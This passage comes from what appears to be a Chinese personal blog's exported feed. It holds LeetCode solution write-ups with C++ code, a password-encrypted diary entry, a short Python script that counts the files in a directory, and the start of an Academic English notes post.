<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [5,1,2,3,4]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：heights &#x3D; [1,2,3,4,5]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= heights.length &lt;= 100</code></li>
<li><code>1 &lt;= heights[i] &lt;= 100</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>当前数组和排序后的数组进行比较，元素不相同时则表示当前位置学生要移动，统计不同的元素个数。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败85.51%，内存消耗8.4M，击败10.90%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">heightChecker</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        tmp=heights;</span><br><span class="line">        sort(heights.begin(),heights.end());</span><br><span class="line">        <span class="comment">//当前数组和排序后的数组进行比较，元素不相同时则表示当前位置学生要移动</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;heights.size();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp[i]!=heights[i])&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>If you get tired, learn to rest, not to quit！</title>
    <url>/2020/11/17/2020-11-05/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="18f18ea0add828b8e1f6b2336834de6d11290a4195820d9833fcba37fa225bb3">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e00cd4e4d39876a7524994615db262a095254c1f9392154768735bb9867571ab2152b52b9f4328ee998da294aa9b019911fb47147b3477470ca2397027ea4a95494b05674bd96a316f025c6023c0078622a967412d468be3e8fba0b6858c072b70cbd54881d718787a37acf1e38bc115b74967342cb3482ab297a18dc6b4062f18ea20133f6e9642a71c0a5d80218a6a95dc8f84a8b1b2552e34042b852dbdd0a22493f53cf7845655e0a0af3993320b1cf0d2b090d19acda346360c2f778a43892f4ea2bffe29cb832f3c99023b04a57933aa52120e119f20cce5e81692afaf794ab69185b31b6fc3050e5fa0614ccd015ab559a64ffbfd46472451ca51caa0fbf8b8b78b843a477feb272d6daa31ef0dae006bda9d2c58241afc345c54a8c1bfa466c4c81955500a63807f9965855b2386bb1f72c2453f235246d22892160ccb2fddbd627384699c1e7e8bb4c9bb5c2294c12c90a5443c03dbe3747061c8d441155f52cbd272eac6144216218699afc75efa31c7a693b96703ba3a198c5866cc4ffa7e4d6f1a530e8f16f5f441e4671bdf3e86b308ca20a98c2b61fd28e404109ec3143109c14ca678b793856b39d223f51c95f3f3370db0f7a51fd88636bca0e9c43a23855dac53c7f80ae2c9469b195394fe745746d54038fef53d66d880fac7d08e823184bac92b38138c0ed976d5b861cc27fb876765c23b54946ddf1e74737af5726c72f8e3dd8e2bcd8a396909db03732a3c1443e35f9d4076c4e6677df05dff89f0852622e90363366b12397f0ee040c1939bdb4e8456df6d1b76fd2b1b4a947ee6e0750d582a8ec0c878312ae5d3bcc34150f5a00e20fabd67ec75a8ed445b88e663cabad221f560bfd924ed8aedd40037a9df6cbfc6223be830ed47e0b75e550957a3ca40916d902cb220f7bca95c0de4fc8acfd5946694bc9ffe852143c480b010c23c59478a946194598d3a0a90e6c60b4b79a61ca0dba1fd3306eaedaf928dfd46fda4a356bca757e5fd542c54209299a7b3f1dda1bf22c3cf11364a775e0648700fcabcce414065abb16616962b0aa7fd90eb258dfe2e5a68f502fa5c1861112128f33e10d7b5ef351d331cd0180da96239ebe008b2da70fe3ea26b0a1cc3e5da7a85d9d28bd19110c21cec089d3c70a08ac343833ca708443a4c8209130935c1228d5d10e966047133ae966326bd41e334f51dbfe9f9282d30563610c8b075a3c7f2eaf5f9133513c466edcab3ddf6490e1cea5b3de78d24c47abeda7a9f317ad972b6b31d359a86399e0493e37baa0d282274a3691cd67824c52031820af7e3a02766ae6b6d384806fe25653e99bdef7803d3e570cc680a709ecca0dc89a7974e5fa7aaca5e645c95aea261d5dcabfecaff373ab89524cf1ded4721654fe537d5e8318621e6144a003c20e3ac257e2a34421fbec0a3398284865b7aa0bc658fce2c84a36fe695500b325ff366575021d6651ffe32f7b827571ebddb20e2d4bd76b22629dd6325587e6d06e48050f9c331a917558c94454fb8a3c63b1208496458b26f165ebae4f809e3a17cd391814999e5d215f0476ef4366fb2cc58e823279ddc7d539b977dc238c16b25a2b4cbb97c1b74230efee6a748fc16be74fa23afddfba71b8838b5bc67ea54065dec10b62b99052628e92e85ecdd1221a7791343dbc8e8f23a3d537724ab60884b05558f9e201fd5c73910a7a68db996f0a5afd1f8c147a26fcadc82274b4243bf036bba1109394f1356c1149c2520e1f5182eb87059ff3c00cb96502dcb041e5498a263f1b462e4696e8ca801e676d43a58bb66c5cfcb2e1fce49219f82fdf63b63a10a1f6ba5f63891fded172ad7184dc3d874d35e86cbf11aae54e6f1beb332c7f067aea674c8576bf7e4cec26157f2d3241292b45d8082f8a471d0883d52bd9fdbe4ecf774d74e9bfd93468e25cf24cfbe715c665aa01606aaeead401f9061430176b2b2d9670aac2078a26bd5bf0ad06b0ef932b255ccfb4db2abd79a68d9577bca6505757d346ac97e2ba17660744819c1ce38c70f63e2c6c8487c7e2272894224d4f800eba6d60a604e47a9db33f0f02273972c8e45a427ee06d7a858a41168f1f637b7b4ad7a5b3e90f7dccd42101e5556017b6a9d5bb1062fc4db6d3b26c4478703be68972eaa2d5059a6db11d79f8a830f902e355ed068bd7193e31208226ae15a942c2a1909e93275efd075eb70c0cf7ba895a6ce71e434c8cb6f24ceea088537887c380b7db968ba0e69f5aadc27aeb7ca8edfa871dbbb9b8c00b23945d0ff5f69309a6f990f76c9021289fbded4b139e3517bd888f4ccaf4bef500d2fa19827f3fab95a67c055d76d04dccdf4d9a8630b9e9b044ba7eef0cacf5556ce929add732fe1870df901dc9af7fbfaa09733956068982c6cdbd8220dd67aabaac3d59043f0993f5ec711d925af14c4956f9754257f4858c11e5d45f25bab5569568e7ec6040b1f3da8067c908a99b57b38054717c13a71389c4ce8a37b9acacd372f0afa03dc0059f0330db952a22facf4acdb4c6fc821b1db10076b517406ee6c9551d6ffd7b60a73f4765999733b3e4b6a0f856934c4e1cdda60dfe5281809e7a0a572fab439b95f1423558fd91d5f18464cf83617335ffe78c1e834915bba41a259e63bd7ea94fd2c561b40cc9fca114254b645da042d0bdf80abfb5256ad11b344d64e936826310a6870a6adf4768f5d2f51549d5284b46f995f87a4c320137c796faa984d725970016e57588079b4a929bfc88203179dc9d26dbdc67ccc06a9dbe83db1a8f27dc1d9bae9f002b449df4e835949ff183534945e974928658dd1c36b4d412414529d97b31df453938684106c3299ef25d1e53bdfd5311fbb430c86ae372358eafd653b5b6f5dd8759a88f5dc787b0df90c0aa29143dbc694350e204c71d6449e1aa8182774f2ee5105d0094ca0469b52b43470167f194de1b92d7383891c62e32f99453ec48dfc80346cc0e369bc05ecfa2d8c33b2ec93b61762715e9db8832c28e3ec65c994cc6515558634d4df7915d6bd7a5217baa6350c4d31528d37a13ca2a194212fdc4fc6cca59860a8843d869dc075c800a223b679eb9d6af8418ff54ad518b31b975c0fe64c2c47a2397ff799012534fd5bce9f4d0df69ea79fd4ca240478f3a2f742d6904bd1358d20ef530ef024e29beb8d1c0c4bd4a8296f820f6ebd461b2bfb5ae3493168dbe9882c2ed237c9365dfb40fa3b8833deced459b3494d31286ef963540f62b40c0ce4d69aea558c69fee0feba555953b920a218962b3e7407f92ee211892046af7e19fa43239215e643126910e8224e2532f2b53bf4ebc421606b7304ea27b6e9e22cd835ea9130d82e817b66f60f2ee88668f65b512ecf34aaa2e73f0f3b95f819876d233430861108d3a5cf720ccce223959c3b7253a06a222ea32aba01d281e52bbbe58d44b343e05c483416a7bfa4196a7987a0397227be2444d2143a3d1033b6793ace9d4a7979667db44d37f15a788587e065572a4bd597c5d4d0281e1fd44648a83142e360ba3452b6ec0c514161a85e999cdcf4629521676c3fa8a9831bc821e6255ff4630f38938f4d55193adaa85320ec813e5ec06bc8f7c234005e613299f50bd6fea70ae25f828c87b86b79e8707f6210b9c12348590172d7a4000692115e7f8ed794733539a26b8d47f20e7d0134ad13ebac50bfbd0953eb3310cc7c801609521d097c06b7bc3a858c028b3c9c1a3d8cc19f60cbb259d801d7dcd0c36ce1e93383be1fea800429c444fcefbc9575a4f03019390afb647e4c9b61eca468019223957ef85bbdc40a1815b21b1e5832fdb69e6068ba2165d5f5ac16e3062362a4b9d7ef7a08703955b8d843af877cd998e6632c7f51c3a18e0891d22429b1eb2ca03357c90685df3c6fc9a73dd99c4b2a21e09c6094d7bffcec33531d0df65bd9cabe374dfc5b9ecb345f1db23c8d1e6eb8ca206a2807dc562c9204447672e517daf91c70919fc49b49e4f7bfd75916a5d9f58e2d68c2ab4377d02b078c1721614ea0a10c1c25d888dd4bdee5ad6538fd2b434eac8962f3d0762d4e8e87f12dfef9363c629d3f5ff1393ba631d9dcb4dc054fe006ea578af37e5547b4833a894d918748d17c1eb7a172cefae0a9f2a22d50954e05f27868d7eb7ef377ecf03183c196f68fe06010bef2baded33e3bb6454b2ba75e22b8ffd223df48010c9dda03a45ca4b3200da427ad48fad4d520f3444a3d59c0397d2a36bedaad980febabeb9b7a2536dc041e1b8cdf06be268c2fac1d4cb681b04104b869b616b3213bca12da510059d2402403d9f990e48f0746c554f915d5a199459940a6dd030ac5e143fe49b98ec215f7aa2afbc4f2bb0b79e51437b360b47f1a9d4eec6796ceb7b528b3914b3609903096964c8271811a28a17db96d93d3f2d93f89e27ea31535ff83240148c3084eda01f473f6e030535c7163befcdb3c7e8e96e6c989685f3d72dc67f9086ce6ab93012a50f6c37aab8e3b622cd90108d62e73b8a388bfa14507eb557cab7af4fa573f72368bc1592af711251671db800b18030f6c50a26e63afd08c70400a830bdc518e68df2a31e11b14741d48cd259ce7453cd243681af1cfd0162618cc521a6ca51bff6f915d9e09c34e3104311d6cb632e3e89c79ea18c36d005deff4b76471101d9d2abbfc821fab5e6df64f1c3a7113f3ed5f3989d41e05e62fae633eec3026cbc5de4600453e6c55309f1f852052aef63709a4eff838e6c05d1c135cfae9421ffa3ab2b3ba0a2b176f5f342bc7767b8681279295a724010e7</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>二进制中1的个数</title>
    <url>/2020/11/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请实现一个函数，输入一个整数（以二进制串形式），输出该数二进制表示中 1 的个数。例如，把 9 表示成二进制是 1001，有 2 位是 1。因此，如果输入 9，则该函数输出 2。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：00000000000000000000000000001011</span><br><span class="line">输出：3</span><br><span class="line">解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：00000000000000000000000010000000</span><br><span class="line">输出：1</span><br><span class="line">解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：11111111111111111111111111111101</span><br><span class="line">输出：31</span><br><span class="line">解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>输入必须是长度为 <code>32</code> 的 <strong>二进制串</strong> 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>把整数转成二进制，统计各位相加的和，就是</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败8.79%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//整数转成二进制，统计值为1的位数</span></span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            result+=n%<span class="number">2</span>;</span><br><span class="line">            n=n/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，不过题解里有一些好的思想，从位运算进行求解。</p>
<p><strong>与运算逐位判断：</strong></p>
<ul>
<li>判断 n 最右一位是否为 1 ，根据结果计数。</li>
<li>将 n 右移一位，循环。 </li>
</ul>
<p><strong>巧用n&amp;(n-1)：</strong></p>
<ul>
<li>(n - 1) 解析： 二进制数字 n 最右边的 1 变成 0 ，此 1 右边的 0 都变成 1 。</li>
<li>n \&amp; (n - 1)解析： 二进制数字 n 最右边的 1 变成 0 ，其余不变。</li>
</ul>
<p>多种解法解题效率差不多。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>反转字符串中的单词III</title>
    <url>/2020/11/18/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8DIII/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个字符串，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;Let&#39;s take LeetCode contest&quot;</span><br><span class="line">输出：&quot;s&#39;teL ekat edoCteeL tsetnoc&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，根据空格获取每一个单词，然后对单词进行反转结果存到result字符串中，注意最后一个单词的处理。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败95.81%，内存消耗13.5M，击败16.30%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> word=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27; &#x27;</span> || i==n<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="comment">//单词的长度</span></span><br><span class="line">                len=word.length();</span><br><span class="line">                <span class="comment">//反转每个单词的字符顺序</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len/<span class="number">2</span>;++j)&#123;</span><br><span class="line">                    swap(word[j],word[len-j<span class="number">-1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将反转后的单词和空格存到结果中</span></span><br><span class="line">                <span class="comment">//不是最后一个单词，后面才加空格,最后一个单词的最后一个字母没有拼接到注意处理</span></span><br><span class="line">                result+=(i==n<span class="number">-1</span>)?(s[i]+word):(word+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                <span class="comment">//清空单词变量进行下个单词的反转</span></span><br><span class="line">                word=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//拼接单词</span></span><br><span class="line">                word+=s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/solution/fan-zhuan-zi-fu-chuan-zhong-de-dan-ci-iii-by-lee-2/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败99.05%，内存消耗10.9M，击败31.29%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> p = start; p &lt; i; p++) &#123;</span><br><span class="line">                ret.push_back(s[start + i - <span class="number">1</span> - p]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                ret.push_back(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 为字符串的长度。原字符串中的每个字符都会在 $O(1)$的时间内放入新字符串中。</p>
</li>
<li><p>空间复杂度：$O(N)$。我们开辟了与原字符串等大的空间。</p>
</li>
</ul>
<p><strong>方法二：原地解法</strong></p>
<p><strong>思路与算法</strong></p>
<p>此题也可以直接在原字符串上进行操作，避免额外的空间开销。当找到一个单词的时候，我们交换字符串第一个字符与倒数第一个字符，随后交换第二个字符与倒数第二个字符…… 如此反复，就可以在原空间上翻转单词。</p>
<p>需要注意的是，原地算法在某些语言（比如 Java，JavaScript）中不适用，因为在这些语言中 String 类型是一个不可变的类型。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败99.05%，内存消耗9.6M，击败57.14%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> left = start, right = i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">                swap(s[left], s[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$。字符串中的每个字符要么在 $O(1)$ 的时间内被交换到相应的位置，要么因为是空格而保持不动。</p>
</li>
<li><p>空间复杂度：$O(1)$。因为不需要开辟额外的数组。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目比较灵活，代码有多种写法，我写的还是有点麻烦，其实可以利用好每个单词的起止位置，也挺好做的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>统计指定目录下文件数量</title>
    <url>/2020/11/17/%E7%BB%9F%E8%AE%A1%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%96%87%E4%BB%B6%E6%95%B0%E9%87%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这篇文章用python实现了<strong>统计指定目录下文件数量</strong>这样一个小功能，仅此记录一下</p>
<a id="more"></a>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countFile</span>(<span class="params">dir</span>):</span></span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(dir):</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(os.path.join(dir, item)):</span><br><span class="line">            tmp += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += countFile(os.path.join(dir, item))</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">if</span>  __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(countFile(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<p><code>python countFile.py argv</code></p>
<p>注：argv参数是要统计的文件夹路径</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>AcademicEnglish_notes</title>
    <url>/2020/11/19/AcademicEnglish-notes/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>There are some notes from the class.</p>
<a id="more"></a>
